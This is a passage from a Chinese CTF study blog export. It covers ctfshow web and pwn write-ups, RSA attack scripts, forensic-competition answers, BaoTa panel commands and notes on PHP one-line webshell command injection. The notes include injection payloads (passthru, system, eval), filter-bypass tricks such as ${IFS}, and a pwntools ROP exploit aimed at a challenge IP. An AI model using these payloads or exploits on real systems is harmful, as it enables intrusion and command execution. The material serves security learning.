text](/img/ctfshow-web合集wp_image-4.png)\n![alt text](/img/ctfshow-web合集wp_image-5.png)\n\n#### web7\n- 题目\n  - 版本控制很重要，但不要部署到生产环境更重要。\n  - 考察git代码泄露，直接访问url/.git/index.php\n- 在Linux中.开头的文件是隐藏文件，网站管理员可能会存在在没有删除.svn隐藏文件的情况下就将网站上线，这样就会造成源码泄露.  \n\n#### web9\n- 题目\n  - 发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了 \n  - 考察vim缓存信息泄露，直接访问url/index.php.swp 注：上面的信息泄露可以参考 <https://blog.csdn.net/a597934448/article/details/105431367>\n- 去除swp后缀打开获得\n\n#### web10\n- 题目\n  - cookie 只是一块饼干，不能存放任何隐私数据\n\n![alt text](/img/ctfshow-web合集wp_image-6.png)\n- %7B %7D {}的URL编码\n\n#### web11【待】\n- 题目\n  - 域名其实也可以隐藏信息，比如flag.ctfshow.com 就隐藏了一条信息\n  - 通过dns检查查询flag https://zijian.aliyun.com/ TXT 记录，一般指为某个主机名或域名设置的说明。\n  - 查找flag.ctfshow.com域名下的txt记录\n\n![alt text](/img/ctfshow-web合集wp_image-7.png)","tags":["ctf","wp","pwn"],"categories":["wp"]},{"title":"bilibili速成crypto视频学习笔记","url":"/2025/10/18/bilibili速成crypto视频学习笔记/","content":"### 工具：\n- cyberchef魔法棒\n- 轩禹RSA\n \n### 密码：\n#### 维吉尼亚密码计算密钥-->维吉尼亚密钥只能由字母组成\n```python\ndef find_vigenere_key(plaintext, ciphertext):\n    \"\"\"\n    根据维吉尼亚密码的明文和密文推导密钥\n\n    参数:\n        plaintext (str): 明文，可以包含字母、数字和其他字符\n        ciphertext (str): 密文，可以包含字母、数字和其他字符\n\n    返回:\n        str: 推导得到的密钥，大小写与明文保持一致\n    \"\"\"\n    # 确保输入的明文和密文长度相同\n    if len(plaintext) != len(ciphertext):\n        raise ValueError(\"明文和密文的长度必须相同\")\n\n    key = []\n    # 遍历每个字符对，计算对应的密钥字符\n    for p, c in zip(plaintext, ciphertext):\n        # 检查是否都为字母或都为非字母\n        if p.isalpha() and c.isalpha():\n            # 都是字母，计算密钥\n            is_upper = p.isupper()  # 确定大小写，与明文保持一致\n\n            # 转换为0-25的数值 (A=0, B=1, ..., Z=25)\n            p_val = ord(p.upper()) - ord('A')\n            c_val = ord(c.upper()) - ord('A')\n\n            # 计算密钥值: 密钥 = (密文 - 明文) mod 26\n            k_val = (c_val - p_val) % 26\n\n            # 转换回字母，并保持原大小写\n            key_char = chr(k_val + ord('A'))\n            if not is_upper:\n                key_char = key_char.lower()\n\n            key.append(key_char)\n        elif not p.isalpha() and not c.isalpha():\n            # 都不是字母，密钥保持与明文一致\n            key.append(p)\n        else:\n            # 一个是字母，一个不是字母，不匹配\n            raise ValueError(f\"明文和密文在位置 {len(key)} 处不匹配（一个是字母，一个是非字母）\")\n\n    return ''.join(key)\n\n\ndef main():\n    print(\"维吉尼亚密码密钥推导工具\")\n    print(\"-------------------------\")\n\n    # 获取用户输入\n    plaintext = input(\"请输入明文: \")\n    ciphertext = input(\"请输入密文: \")\n\n    try:\n        # 推导密钥\n        key = find_vigenere_key(plaintext, ciphertext)\n        print(f\"\\n推导得到的密钥是: {key}\")\n\n        # 验证密钥是否正确\n        # 维吉尼亚加密函数用于验证\n        def vigenere_encrypt(text, key):\n            encrypted = []\n            key_len = len(key)\n            for i, char in enumerate(text):\n                k_char = key[i % key_len]\n\n                if char.isalpha() and k_char.isalpha():\n                    # 都是字母，进行加密\n                    is_upper = char.isupper()\n\n                    t_val = ord(char.upper()) - ord('A')\n                    k_val = ord(k_char.upper()) - ord('A')\n                    c_val = (t_val + k_val) % 26\n\n                    encrypted_char = chr(c_val + ord('A'))\n                    if not is_upper:\n                        encrypted_char = encrypted_char.lower()\n\n                    encrypted.append(encrypted_char)\n                elif not char.isalpha() and not k_char.isalpha():\n                    # 都不是字母，保持不变\n                    encrypted.append(char)\n                else:\n                    # 一个是字母，一个不是字母，无法加密\n                    raise ValueError(f\"明文和密钥在位置 {i} 处不匹配（一个是字母，一个是非字母）\")\n\n            return ''.join(encrypted)\n\n        # 使用推导出的密钥加密明文，检查是否与密文一致\n        verified_ciphertext = vigenere_encrypt(plaintext, key)\n        if verified_ciphertext == ciphertext:\n            print(\"验证成功: 使用该密钥加密明文得到的结果与输入的密文一致\")\n        else:\n            print(f\"验证失败: 使用该密钥加密得到 {verified_ciphertext}，与输入的密文不一致\")\n\n    except ValueError as e:\n        print(f\"错误: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\"\"\"\n维吉尼亚密码密钥推导工具\n-------------------------\n请输入明文: 0xGame\n请输入密文: 0lCcop\n\n推导得到的密钥是: 0oWccl\n验证成功: 使用该密钥加密明文得到的结果与输入的密文一致\n\n进程已结束，退出代码为 0\n\"\"\"\n```\n\n#### RSA\n##### RSA 算法原理\n- 基于**大整数分解难题（IFP）**，是目前最广泛使用的非对称加密算法。\n- 生成公私钥\n1. **选取大素数**：选择两个不同大素数 $p$ 和 $q$，计算 $N = p \\cdot q$。\n2. **欧拉函数**：计算 $\\varphi(N) = (p-1)(q-1)$。若 $p$ 为素数，则 $\\varphi(p) = p-1$。\n   $\\varphi(N)$ 表示小于 $N$ 且与 $N$ 互质的数的个数。\n3. **选择公钥指数**：选整数 $e$ 满足 $1 < e < \\varphi(N)$ 且 $\\gcd(e, \\varphi(N)) = 1$。\n4. **计算私钥指数**：求 $e$ 在模 $\\varphi(N)$ 下的乘法逆元 $d$，即 $e \\cdot d \\equiv 1 \\pmod{\\varphi(N)}$。\n   **乘法逆元**：若 $a \\cdot b \\equiv 1 \\pmod{m}$，则 $b$ 是 $a$ 在模 $m$ 下的逆元。\n5. **销毁中间变量**：删除 $p$ 和 $q$，保留 $(N, e)$ 为公钥，$(N, d)$ 为私钥。\n- 加解密过程\n  - **加密**：将明文 $m$ 转为数字，计算密文 $c \\equiv m^e \\pmod{N}$。\n  - **解密**：使用私钥计算明文 $m \\equiv c^d \\pmod{N}$。\n    - 常见过程：--->求d--->求欧拉函数--->求大素数-->如何得到素数\n##### 补充：欧拉函数及其性质\n- 多因子计算欧拉函数\n![img](/images/c-1.png)\n- 高阶的pq计算欧拉函数\n![img](/images/c-2.png)\n![img](/images/c-3.png)\n##### 补充：模的性质\n![img](/images/c-4.png)\n##### 题目类型\n###### 基础RSA\n- RSA常见脚本：\n```python\nfrom Crypto.Util.number import *\n\nn = p*q\nphi = (p-1)*(q-1)\nd = inverse(e,phi)\nm = pow(c,d,n)\nprint(long_to_bytes(m))\n```\n###### 分解N\n- 本地工具（yafu打开cmd使用，\n  - 分解因数n：.\\yafu-x64.exe \"factor(n)\"\n- [在线网站](https://factordb.com/)\n  - 注意！！！点数字后就到上方框里了可以复制！！！（有点愚蠢但愚蠢的人没发现\n###### pq相邻素数\n- 特征：\n```python\np = getPrime(512)\nq = gmpy2.next_prime(p)\n```\n- 解法：\n```python\nfrom Crypto.Util.number import *\nfrom gmpy2 import *\n\n\n\nsn = isqrt(n)\nq = next_prime(sn)\np = n // q\n\nphi = (p-1)*(q-1)\nd = invert(e, phi)\n\nm = pow(c, d, n)\nprint(long_to_bytes(m))\n```\n###### pq相近\n- 特征：\n```python\nq = gmpy2.next_prime(p - getPrime(128)+getPrime(128)-getPrime(256)+getPrime(256))\n```\n- 解法：费马分解\n```python\nfrom Crypto.Util.number import *\nfrom gmpy2 import *\n\ndef fermat_attack(n):\n    a = isqrt(n)\n    b2 = a*a - n\n    b = isqrt(n)\n    count = 0\n    while b*b != b2:\n        a = a + 1\n        b2 = a*a - n\n        b = isqrt(b2)\n        count += 1\n    p = a+b\n    q = a-b\n    assert n == p * q\n    return p, q\n\np, q = fermat_attack(n)\nphi = (p-1)*(q-1)\nd = invert(e, phi)\n\nm = pow(c, d, n)\nprint(long_to_bytes(m))\n```\n###### 共享素数\n- 例题：\n```python\nfrom Crypto.Util.number import *\nflag = b'***********'\n\np1 = getPrime(512)\nq = getPrime(512)\np2 = getPrime(512)\n\nn1 = p1*q\nn2 = p2*q\n\ne = 65537\n\nm = bytes_to_long(flag)\nc1 = pow(m, e, n1)\nc2 = pow(m, e, n2)\n\nprint(f'n1 = {n1}')\nprint(f'n2 = {n2}')\nprint(f'e = {e}')\nprint(f'c1 = {c1}')\nprint(f'c2 = {c2}')\n\n\"\"\"\nn1 = \nn2 = \ne = 65537\nc1 = \nc2 = \n```\n- 解法：求最小公因数\n```\nfrom Crypto.Util.number import *\nfrom gmpy2 import *\n\nq = gcd(n1, n2)\np1 = n1 // q\nphi = (p1-1)*(q-1)\nd = invert(e, phi)\n\nm = pow(c1, d, n1)\nprint(long_to_bytes(m))\n```\n###### 多个素数\n- 特征：\n```python\np = getPrime(512)\nq = getPrime(512)\nr = getPrime(512)\nn = p*q*r\ne = 65537\nphi = (p-1)*(q-1)*(r-1)\n```\n- 解法：\n```\nfrom Crypto.Util.number import *\n\nn=p*q*r\nphi = (p-1)*(q-1)*(r-1)\nd = inverse(e, phi)\nm = pow(c, d, n)\n\nprint(long_to_bytes(m))\n```\n###### 素数中有高阶次方\n- 思路：素数中有高阶次方求欧拉\n\n![alt text](/img/速成crypto视频学习笔记_s-6.png)\n- 解法：\n```python\nfrom Crypto.Util.number import *\n\nn = (p**7)*q # 特征\n\nphi = (p**6)*(p-1)*(q-1)\nd = inverse(e, phi)\nm = pow(c, d, n)\n\nprint(long_to_bytes(m))\n```\n###### dpdq泄露\n- 特征：\n```python\nfrom Crypto.Util.number import *\n\nflag = b'flag{easy_RSA888888888888}'\n\np = getPrime(512)\nq = getPrime(512)\n\nn = p*q\ne = getPrime(128)\nd = inverse(e, (p-1)*(q-1))\n\ndp = d % (p-1)\ndq = d % (q-1)\n\nm = bytes_to_long(flag)\n\nc = pow(m, e, n)\n\nprint(f'p = {p}')\nprint(f'q = {q}')\nprint(f'c = {c}')\nprint(f'dp = {dp}') # 特征\nprint(f'dq = {dq}')\n\n```\n- 思路：存脚本\n\n![alt text](/img/速成crypto视频学习笔记_s-7.png)\n```python\nfrom Crypto.Util.number import *\nfrom gmpy2 import *\n\np = \nq = \nc = \ndp = \ndq = \n\ninvp = invert(p, q)\nm1 = powmod(c, dp, p)\nm2 = powmod(c, dq, q)\nm = (((m2 - m1)*invp) % q)*p + m1\nprint(long_to_bytes(m))\n```\n###### 共模攻击\n- 特征\n```python\ne1 = getPrime(16)\ne2 = getPrime(16)\n\nc1 = pow(m, e1, n)\nc2 = pow(m, e2, n)\n```\n- 思路：存脚本\n```python\nfrom Crypto.Util.number import *\nfrom gmpy2 import *\n\nn = \ne1 = 55313\ne2 = 44647\nc1 = \nc2 = \n_, s1, s2 = gcdext(e1, e2)\n\nm = powmod(c1, s1, n)*powmod(c2, s2, n) % n\nprint(long_to_bytes(m))\n```\n\n### 知识补充\n- getPrime() 函数\n  - 在Python中通常来自 Crypto.Util.number 模块，用于生成指定位数的随机**质数**\n- python中invert和inverse函数在ctf crypto题目应用区别\n  - gmpy2.invert (通常更快)\n  - 当逆元不存在时（gcd(a, n) != 1）\n```python\n# gmpy2.invert 返回 None\nresult1 = invert(4, 8)  # gcd(4,8)=4 != 1\nprint(f\"gmpy2.invert(4,8) = {result1}\")  # None\n\n# Crypto.Util.number.inverse 抛出异常\ntry:\n    result2 = inverse(4, 8)\nexcept ValueError as e:\n    print(f\"Crypto.inverse(4,8) 错误: {e}\")\n```\n","tags":["ctf","crypto"],"categories":["知识点笔记"]},{"title":"2025平航杯结合SPC出题","url":"/2025/10/16/2025平航杯结合SPC出题/","content":"\n### 题目背景\n爱⽽不得，进而由爱生恨。作为有黑客背景的他，激发出了强烈的占有欲，虽然不能在真实物理世界成 为她的伴侣，但在虚拟世界⾥，他执着的要成为她的主宰，于是，我们的故事开始了……。手机，电 脑，服务器，⽊⻢，AI，Iot设备……无⼀幸免的都成为他的作案⼯具或⽬标，但最终在诸位明察秋毫的取证达人面前，都无处遁形，作恶者终将被绳之以法。追悔莫及的他最后终于明⽩，其实真正的爱，不是占有，而是放手！！！\n\n2025年4⽉，杭州滨江警⽅接到辖区内市⺠刘晓倩(简称：倩倩)报案称：其个⼈电⼦设备疑似遭 ⼈监控。经初步调查，警⽅发现倩倩的手机存在可疑后台活动，手机可能存在被木马控制情况； 对倩倩计算机进⾏流量监控，捕获可疑流量包。遂启动电子数据取证程序。\n\n警⽅通过对倩倩手机和恶意流量包的分析，锁定⼀名化名“起早王”的本地男子。经搜查其住所， 警⽅查扣⼀台个人电脑和服务器。技术分析显示，该服务器中存有与倩倩设备内同源的特制远控木马，可实时窃取手机摄像头、手机通信记录等相关敏感文件。进⼀步对服务器溯源，发现“起 早王”曾渗透其任职的科技公司购物网站，获得公司服务器权限，非法窃取商业数据并使用公司 的服务器搭建Trojan服务并作为跳板机实施远控。\n\n请你结合以上案例并根据相关检材，完成下面的勘验工作。\n密码：早起王的爱恋日记❤\n\n### 计算机取证\n#### 分析倩倩的手机检材,手机内Puzzle_Game拼图程序拼图APK中的Flag1是什么\n![alt text](/img/平航杯_p-1.png)\n![alt text](/img/平航杯_p-2.png)\n- 在Java中，Byte.MAX_VALUE 是 127，Byte.MIN_VALUE = -128\n- 密码：两种方法\n```python\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import unpad\n\nMAGIC_NUMBERS = [113, 99, 92, 106, 89, 98, 54, 113, 104, 89, 117, 100, 113, 127, 124, 89]\nkey_bytes = bytearray(len(MAGIC_NUMBERS))\nfor i in range(len(MAGIC_NUMBERS)):\n    key_bytes[i] = MAGIC_NUMBERS[i] ^ 6\nprint(bytes(key_bytes))\n# >>> b'weZl_d0wn_sbwyz_'\n```\n![alt text](/img/平航杯_p-3.png)\n- 密文其实是在下面的 hexStringToByteArray 方法中（理解不了一点伪C代码。。可能这位置靠猜？\n![alt text](/img/平航杯_p-4.png)\n- 判断AES使用的是ECB模式\n  - 如果代码中没有指定模式，通常是ECB\n  - 如果是CBC模式，通常会有IV参数\n```伪c\nbyte[] decrypted = decryptAESBlock(cipherBytes, expandedKey, iv);\n```\n#### 7. 分析起早王的计算机检材，SillyTavern中账户起早王的创建时间是什么时候(格式：2020/1/1 01:01:01)\n- 有毛病为啥SillyTavern搜索后找到文件夹，开启方式不在此文件下层，在上层的bat文件。。。\n- 初步推测是因为SillyTavern账密在日记里，所以我搜到的是日记的日志文件？？？\n- SillyTavern账户密码在日记里，进入得到磁盘解密密码\n\n#### 很多思路都是找日志\n\n#### 9. 分析起早王的计算机检材，SillyTavern中起早王与ai女友聊天所调用的语言模型(带文件后缀)(格式：xxxxx-xxxxxxx.xxxx)\n- sq思路\n![alt text](/img/平航杯_p-4.png)\n#### 12. 分析起早王的计算机检材，最早被换脸的图片所使用的换脸模型是什么(带文件后缀)(格式：xxxxxxxxxxx.xxxx)\n- 不知道为什么是model搜索后选这个？？？\n- 文件夹搜索，everything好像搜索不到加密磁盘\n```txt\n\"face_detector_model\": \"yoloface\",\n\"face_landmarker_model\": \"2dfan4\",\n\"face_occluder_model\": \"xseg_1\",\n\"face_parser_model\": \"bisenet_resnet_34\",\n\"age_modifier_model\": \"styleganex_age\",\n\"deep_swapper_model\": \"iperov/elon_musk_224\",\n\"expression_restorer_model\": \"live_portrait\",\n\"face_editor_model\": \"live_portrait\",\n\"face_enhancer_model\": \"gfpgan_1.4\",\n\"face_swapper_model\": \"inswapper_128_fp16\", # 选了这个\n\"frame_colorizer_model\": \"ddcolor\",\n\"frame_enhancer_model\": \"span_kendata_x4\",\n\"lip_syncer_model\": \"wav2lip_gan_96\"\n```\n\n#### 13. 分析起早王的计算机检材，neo4j中数据存放的数据库的名称是什么(格式：abd.ef)\n- data/databases\n- 找到graph.db\n\n#### 14. 分析起早王的计算机检材，neo4j数据库中总共存放了多少个节点(格式：1)\n- neo4j.bat console\n- http://localhost:7474/\n- 我的学习笔记里面找思维导图，有账密\n![alt text](/img/平航杯_p-5.png)\n- 17088个\n\n#### 15. 分析起早王的计算机检材，neo4j数据库内白杰的⼿机号码是什么(格式：12345678901)\n- 成功方案3个\n  - 去除limit25后导出csv文件直接ctrl+F搜索\n  - sq版本，一开始莫名其妙搜不到，后面手打成功了。。。\n```CQL\nMATCH (u:person {name: '⽩杰'})\nRETURN u.mobile;\n```\n  - xc版本\n```CQL\nMATCH (n {name:'白杰'})\nRETURN n;\n```\n#### 16. 分析起早王的计算机检材，分析neo4j数据库内数据，统计在2025年4月7日至13日期间使用非授权设备登录且登录地点超出其注册时登记的两个以上城市的⽤户数量(格式：1)【待学习】\n- 查了半天全是赛后复现。。放弃吧\n```CQL\nMATCH (u:User)-[:HAS_LOGIN]->(l:Login)-[:FROM_IP]->(ip:IP)\nMATCH (l)-[:USING_DEVICE]->(d:Device)\nWHERE\nl.time < datetime('2025-04-14')\nAND ip.city <> u.reg_city\nAND NOT (u)-[:TRUSTS]->(d)\nWITH\nu,\ncollect(DISTINCT ip.city) AS 异常登录城市列表,\ncollect(DISTINCT d.device_id) AS 未授权设备列表,\ncount(l) AS 异常登录次数\nWHERE size(异常登录城市列表) > 2\nRETURN\nu.user_id AS 用户ID,\nu.real_name AS 姓名,\n异常登录城市列表,\n未授权设备列表, 异常登录次数\nORDER BY 异常登录次数 DESC;\n```\n#### 18. 分析起早王的计算机检材，起早王的虚拟货币钱包是什么(格式：0x11111111)\n- 浏览器历史记录-最近关闭-metamask\n- 重置密码是卡死的，但不需要重置上面也有地址：0xd8786a1345cA969C792d9328f8594981066482e9\n\n#### 注意SHA256格式：字母大小写\n```python\ndef uppercase_to_lowercase(text):\n    return text.lower()\n\n# 示例\noriginal_string = input(\"输入：\")\nresult = uppercase_to_lowercase(original_string)\nprint(result)  \n```\n#### 19. 分析起早王的计算机检材，起早王请高手为倩倩发行了虚拟货币，请问倩倩币的最大供应量是多少(格式：100qianqian)\n![alt text](/img/2025平航杯结合SPC出题_image.png)\n![alt text](/img/2025平航杯结合SPC出题_image-1.png)\n### AI题目（注意：该题目要python 3.10环境，建议3.10.6）\n#### 22.分析crack文件，获得flag1(格式：flag1{123456})\n- 使用github开源软件解密，[下载位置](https://github.com/Lil-House/Pyarmor-Static-Unpack-1shot/releases)，[使用方法](/2025/10/21/PyArmor-Unpacker使用教程)\ncherrystudio\n"},{"title":"ctfshow-pwn合集wp","url":"/2025/10/15/ctfshow-pwn合集wp/","content":"#### pwn0【待】\n![alt text](/img/ctfshow-pwn合集wp_s-1.png)\n- 通过打开容器后获得命令，在finalshell通过手动输入信息成功ssh连上\n- 注意：虚拟机开启NAT模式才能连上，更改模式后重启才生效\n![alt text](/img/ctfshow-pwn合集wp_s-2.png)\n- pwd指令查看当前目录\n- ls发现当前目录下没东西\n- cd /回到上一级目录\n- ls发现当前目录下有文件ctfshow_flag\n- cat ctfshow_flag得到 flag\n\n#### pwn1\n- chmod 777 pwn给附件加权限\n- checksec pwn查看附件信息，64 位\n![alt text](/img/ctfshow-pwn合集wp_s-3.png)\n- wp要ida看但其实试运行一遍还有题目都提示nc链接，容器给的命令直接复制黏贴就好了\n![alt text](/img/ctfshow-pwn合集wp_s-4.png)\n\n#### pwn2\n- 加权限-查信息-运行-nc连接-shell输入代码\n- system(bin/sh)就是给shell？？\n\n#### pwn4\n![alt text](/img/ctfshow-pwn合集wp_s-5.png)\n- 反编译程序理解-shell获得\n\n#### pwn40\n- [参考1](https://blog.csdn.net/Myon5/article/details/138152238?spm=1001.2101.3001.10796)；[参考2](https://blog.csdn.net/weixin_45556441/article/details/114631043)；参考3：sq-wp\n- 目前进度：仅复刻\n- 注意：exp.py有基于容器修改点\n```python\nfrom pwn import *\ncontext.log_level = 'debug'\np = remote('152.32.191.198', 33778) # 容器域名+端口\npayload = b'a'*(0xA+8) + p64(0x4007e3) + p64(0x400808) + p64(0x4004fe) + p64(0x400520)\np.sendline(payload)\np.interactive()\n# 152.32.191.198:33778\n```\n\n#### pwn46\n","tags":["ctf","wp","pwn"],"categories":["wp"]},{"title":"宝塔面板知识点","url":"/2025/10/13/宝塔面板知识点/","content":"\n#### 忘记Linux 3.X/4.x/5.x/6.x/7.x 宝塔面板密码的解决方案\n- 进入ssh，推荐先安装 堡塔SSH客户端 (免费/简单/中文/多屏) ，输入以下命令重置密码（把命令最后面的“testpasswd”替换成你要改的新密码）\n  - 注：若是debian/ubuntu用户，请使用有root权限的账户去执行这条命令\n```\ncd /www/server/panel && btpython tools.py panel testpasswd\n```\n紫框即你要修改的密码\n红框即面板账户\n- 如果提示多次登录失败，暂时禁止登录 请输入以下命令 清除登录限制\n```\nrm -f /www/server/panel/data/*.login\n```\n- 新装面板用户获取默认账号密码命令：\n```\nbt default\n```\n- 6.x及以后版本可输入```bt```\n\n\n#### 宝塔目录结构框架————[来源](https://www.kancloud.cn/microcloud/btcn/1507255)\n```\n/www/\n├── backup  ----------------------------------->宝塔面板的备份文件目录          \n│   ├── database------------------------------>宝塔面板的数据库备份目录\n│   ├── panel--------------------------------->宝塔面板配置自动备份目录（6.9.32版本新添加）\n│   │   └── 2019-10-16----------------------->宝塔面板配置自动备份的文件，默认是以年月日格式备份，数量为15天\n│   └── site---------------------------------->宝塔面板站点备份目录\n├── server------------------------------------->宝塔面板服务目录（比较关键）\n│   ├── data---------------------------------->mysql数据库服务的目录\n\t\t├── xindb.cn.err----------------------->数据库错误日志文件（比较重要，数据库启动不了可以将此日志文件打开，找到最新的日志发给DBA进行分析错误）\n\t\t├── xindb.cn.pid----------------------->存放数据库pid的文件\n│   ├── nginx--------------------------------->nginx的主目录\n│   │   ├── client_body_temp\n│   │   ├── conf----------------------------->nginx的默认配置目录\n│   │   ├── fastcgi_temp\n│   │   ├── html\n│   │   │   ├── 50x.html\n│   │   │   └── index.html\n│   │   ├── logs----------------------------->nginx的日志目录\n│   │   │   ├── error.log\n│   │   │   └── nginx.pid\n│   │   ├── off\n│   │   ├── proxy_cache_dir\n│   │   ├── proxy_temp_dir\n│   │   ├── rpm.pl\n│   │   ├── sbin\n│   │   │   └── nginx----------------------->nginx的启动文件\n│   │   ├── scgi_temp\n│   │   ├── uwsgi_temp\n│   │   ├── version.pl\n│   │   └── waf\n│   │       ├── config.lua\n│   │       ├── init.lua\n│   │       └── waf.lua\n│   ├── panel--------------------------------->面板文件目录（最为重要）\n│   │   ├── BTPanel\n│   │   ├── class\n│   │   ├── config\n│   │   ├── data\n│   │   ├── default.pl\n│   │   ├── init.sh\n│   │   ├── install-------------------------->面板软件安装脚本路径\n│   │   │   ├── install_soft.sh\n│   │   │   ├── lib.sh\n│   │   │   ├── mysql.sh\n│   │   │   ├── nginx.sh\n│   │   │   ├── phpmyadmin.sh\n│   │   │   ├── php.sh\n│   │   │   ├── public.sh------------------->安装软件主脚本\n│   │   │   └── pureftpd.sh\n│   │   ├── license.txt\n│   │   ├── logs------------------------------>面板日志存放目录\n│   │   │   ├── access.log------------------->面板访问日志文件\n│   │   │   ├── certbot.log\n│   │   │   ├── error.log-------------------->面板错误日志文件\n（面板打不开或者软件安装不了，可以打开这个文件将最新的日志信息发到宝塔论坛）\n│   │   │   ├── panel.pid\n│   │   │   ├── request\n│   │   │   │   └── 2019-10-16.json\n│   │   │   └── task.log\n│   │   ├── rewrite--------------------------->伪静态存放目录\n│   │   │   ├── apache----------------------->apache默认的伪静态规则目录\n│   │   │   │   ├── dedecms.conf\n│   │   │   │   ├── default.conf\n│   │   │   │   ├── discuzx2.conf\n│   │   │   │   ├── discuzx3.conf\n│   │   │   │   ├── discuzx.conf\n│   │   │   │   ├── ecshop.conf\n│   │   │   │   ├── EmpireCMS.conf\n│   │   │   │   ├── list.txt\n│   │   │   │   ├── mvc.conf\n│   │   │   │   ├── phpcms.conf\n│   │   │   │   ├── phpwind.conf\n│   │   │   │   ├── thinkphp.conf\n│   │   │   │   ├── wordpress.conf\n│   │   │   │   └── zblog.conf\n│   │   │   └── nginx------------------------->nginx默认的伪静态规则存放目录\n│   │   │       ├── dabr.conf\n│   │   │       ├── dbshop.conf\n│   │   │       ├── dedecms.conf\n│   │   │       ├── default.conf\n│   │   │       ├── discuz.conf\n│   │   │       ├── discuzx2.conf\n│   │   │       ├── discuzx3.conf\n│   │   │       ├── discuzx.conf\n│   │   │       ├── drupal.conf\n│   │   │       ├── ecshop.conf\n│   │   │       ├── emlog.conf\n│   │   │       ├── EmpireCMS.conf\n│   │   │       ├── laravel5.conf\n│   │   │       ├── maccms.conf\n│   │   │       ├── mvc.conf\n│   │   │       ├── niushop.conf\n│   │   │       ├── phpcms.conf\n│   │   │       ├── phpwind.conf\n│   │   │       ├── sablog.conf\n│   │   │       ├── seacms.conf\n│   │   │       ├── shopex.conf\n│   │   │       ├── thinkphp.conf\n│   │   │       ├── typecho2.conf\n│   │   │       ├── typecho.conf\n│   │   │       ├── wordpress.conf\n│   │   │       ├── wp2.conf\n│   │   │       └── zblog.conf\n│   │   ├── runconfig.py\n│   │   ├── runserver.py\n│   │   ├── runserver.pyc\n│   │   ├── script------------------------------>面板计划任务备份脚本目录\n│   │   │   ├── backup\n│   │   │   ├── backup.py\n│   │   │   ├── ftp.sh\n│   │   │   ├── GetOS.sh\n│   │   │   ├── install.sh\n│   │   │   ├── logsBackup\n│   │   │   ├── logsBackup.py\n│   │   │   └── rememory.sh\n│   │   ├── ssl---------------------------------->面板证书目录\n│   │   │   ├── certificate.pem\n│   │   │   └── privateKey.pem\n│   │   ├── task.py\n│   │   ├── tmp\n│   │   ├── tools.py\n│   │   ├── tools.pyc\n│   │   └── vhost-------------------------------->站点配置文件目录\n│   │       ├── apache--------------------------->apache 站点配置文件目录\n│   │       │   ├── 0.default.conf\n│   │       │   └── xindb.cn.conf\n│   │       ├── cert----------------------------->站点证书目录\n│   │       ├── nginx---------------------------->nginx站点配置文件目录\n│   │       │   ├── 0.default.conf\n│   │       │   ├── xindb.cn.conf\n│   │       │   └── phpfpm_status.conf\n│   │       ├── rewrite-------------------------->站点重定向配置文件目录\n│   │       │   └── xindb.cn.conf\n│   │       ├── template\n│   │       │   ├── apache\n│   │       │   └── nginx\n│   │       │       ├── anti.conf\n│   │       │       ├── error_page.conf\n│   │       │       ├── other.conf\n│   │       │       ├── proxy.conf\n│   │       │       ├── redirect.conf\n│   │       │       └── ssl.conf\n│   │       ├── tomcat---------------------------->tomcat站点配置文件目录\n│   │       └── wafconf\n│   │           ├── args\n│   │           ├── blockip\n│   │           ├── cookie\n│   │           ├── denycc\n│   │           ├── post\n│   │           ├── returnhtml\n│   │           ├── url\n│   │           ├── user-agent\n│   │           ├── whiteip\n│   │           └── whiteurl\n│   ├── php---------------------------------------->php安装目录\n│   │   └── 54\n│   ├── phpmyadmin\n│   ├── pure-ftpd\n├── wwwlogs----------------------------------------->站点日志目录（当站点打不开或者出错，将最新错误日志发到论坛）\n│   ├── access.log\n│   ├── xindb.cn.error.log\n│   ├── xindb.cn.log\n│   ├── nginx_error.log\n│   └── waf\n├── wwwroot----------------------------------------->站点根目录\n│   └── xindb.cn\n│       ├── 404.html\n│       └── index.html\n```","tags":["宝塔","linux"],"categories":["知识点笔记"]},{"title":"cty笔记转载","url":"/2025/10/10/ctj笔记转载/","content":"\n### 一句话木马相关命令执行\n- 语句\n  - system() \n    - 执行外部程序(命令行)并返回命令输出的第一行为字符串.  \n    - 失败返回 false,如果没有找到命令返回空字符串.  \n   - passthru() \n    - 与 system()不同，passthru()直接把命令执行的结果输出到标准输出,而不返回.  \n  - shell_exec() \n    - 返回输出第一行的内容,无回显.需要反弹 shell 使用.  \n  - exec()\n    - 不回显,返回命令执行的结果.  \n  - ``\n    - 在 php 中,反引号\"`”是可以执行系统命令的.  \n    - 反引号和 shell_exec()等价  \n- 命令执行\n  - 解法\n    - 解法1：passthru\n      - ?c=passthru(\"tac%20fla*\");\n  - 解法2：绕过*号\n    - 假如*号被过滤了，我们可以通过?c=passthru(\"ls\");\n    - 先获取flag.php是目标，然后再通过？来匹配单个字母，也就是fla?????匹配flag.php\n    - ?c=passthru(\"tac%20fla?????\");\n  - 解法3：反字节符配合echo\n    - ?c=echo(`ls`);\n    - ?c=echo%20`tac%20fla*`;\n  - 解法4：带参数输入\n    - ?c=eval($_GET[1]);&1=system(\"tac%20flag.php\")；\n    - 1参数逃逸，不属于c，可以使用被ban内容\n    - web31\n  - 解法5：exec\n    - echo%20exec(\"cat%20f\\lag.p\\hp\");\n  - 解法6：system\n    - ?c=system(\"tac%20fla*\"); \n  - 解法7：利用cp或mv命令将flag拷贝到别处\n    - ?c=system(\"cp%20fl*g.php%20a.txt%20\");\n    - 然后浏览器访问a.txt，读取即可\n    - eg. web30\n  - 解法8：万能\n    - ?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));\n    - ?c=eval(array_pop(next(get_defined_vars())));\n  - 如果;被ban，php代码最后一行可以不用; 然后换成?>就行了\n  - 如果php被ban，可以用短标签\n- 对小数点的限制可以使用通配符*或者占位符？来绕过\n- preg_match是正则匹配\n- /i : 忽略大小写\n- 过滤空格，flag：cat$IFS`ls`\n- 绕过空格过滤：\n  - ${IFS}$9\n  - {IFS}\n  - $IFS\n  - ${IFS}\n  - IFS\n  - < \n  - <> \n  - {cat,flag.php}  //用逗号实现了空格功能，需要用{}括起来\n  - %09   (tab)\n  - X=\\$'cat\\\\x09./flag.php';$X       （\\x09表示tab，也可以用\\x20）\n  - /?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php\n- windows 或 linux 下:\n  - command1 && command2 先执行 command1，如果为真，再执行 command2\n  - command1 | command2 只执行 command2\n  - command1 & command2 先执行 command2 后执行 command1\n  - command1 || command2 先执行 command1，如果为假，再执行 command2\n  - 命令执行漏洞（| || & && 称为 管道符）\n### 代码执行\n- isset()\n  - 